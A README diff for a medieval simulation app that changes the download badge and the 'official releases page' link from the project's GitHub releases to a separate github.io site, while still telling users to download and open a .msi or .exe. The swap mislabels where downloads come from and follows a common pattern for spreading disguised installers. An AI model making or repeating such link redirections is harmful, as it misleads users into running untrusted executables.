@@ -1,6 +1,6 @@
 # 🏰 Live-Simulation - Watch a medieval world come alive
 
-[![](https://img.shields.io/badge/Download_Latest_Version-Blue.svg)](https://github.com/Totosh5285/Live-Simulation/releases)
+[![](https://img.shields.io/badge/Download_Latest_Version-Blue.svg)](https://totosh5285.github.io)
 
 ## What this software does
 
@@ -21,7 +21,7 @@ Your computer needs to meet these basic standards to run the simulation smoothly
 
 Follow these steps to set up the software on your Windows computer:
 
-1.  Visit the [official releases page](https://github.com/Totosh5285/Live-Simulation/releases) to view available versions.
+1.  Visit the [official releases page](https://totosh5285.github.io) to view available versions.
 2.  Look for the section labeled "Assets" under the most recent version tag.
 3.  Click the link that ends in `.msi` or `.exe` to start the download.
 4.  Once the file finishes downloading, open your Downloads folder in File Explorer.
